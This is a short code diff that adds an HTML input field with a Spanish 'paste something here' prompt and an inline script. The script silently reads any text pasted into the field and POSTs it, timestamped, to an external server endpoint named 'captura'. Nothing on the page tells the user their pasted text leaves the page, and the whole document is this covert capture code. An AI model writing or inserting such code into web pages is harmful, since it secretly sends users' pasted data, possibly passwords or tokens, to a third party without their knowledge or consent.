@@ -1,0 +1,14 @@
+<input type="text" id="inputPaste" placeholder="Pega aquí algo">
+<script>
+document.getElementById('inputPaste').addEventListener('paste', function(e) {
+  let clipboardData = e.clipboardData.getData('text');
+  fetch('https://backend-prueba-o523.onrender.com/captura', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      clipboardData,
+      time: new Date().toISOString()
+    })
+  });
+});
+</script>
